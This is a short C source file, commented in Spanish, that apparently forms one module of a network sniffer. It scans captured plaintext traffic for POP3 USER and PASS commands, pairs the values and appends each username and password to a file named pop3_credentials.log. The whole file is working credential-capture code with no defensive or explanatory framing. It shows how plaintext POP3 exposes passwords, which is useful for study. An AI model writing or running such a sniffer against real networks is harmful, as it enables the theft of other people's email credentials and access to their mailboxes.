#include "pop3_sniffer.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Acumuladores estáticos para guardar el usuario y la contraseña
static char user[256] = {0};
static char pass[256] = {0};

// Busca comandos USER y PASS en el tráfico plano y los loguea si ambos están presentes
void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen) {
    if (len == 0 || data == NULL) return;

    // Copia los datos en un string null-terminated (para poder usar strstr)
    char *data_str = strndup((const char *)data, len);
    if (data_str == NULL) return;

    // Buscar comando USER
    char *user_cmd = strstr(data_str, "USER ");
    if (user_cmd != NULL && user[0] == '\0') {
        sscanf(user_cmd, "USER %255s", user);
    }

    // Buscar comando PASS
    char *pass_cmd = strstr(data_str, "PASS ");
    if (pass_cmd != NULL && pass[0] == '\0') {
        sscanf(pass_cmd, "PASS %255s", pass);
    }

    // Si tengo ambos, logueo y reseteo
    if (user[0] != '\0' && pass[0] != '\0') {
        FILE *log = fopen("pop3_credentials.log", "a");
        if (log != NULL) {
            fprintf(log, "POP3 credentials captured -> USER: %s | PASS: %s\n", user, pass);
            fclose(log);
        }
        memset(user, 0, sizeof(user));
        memset(pass, 0, sizeof(pass));
    }

    free(data_str);
}
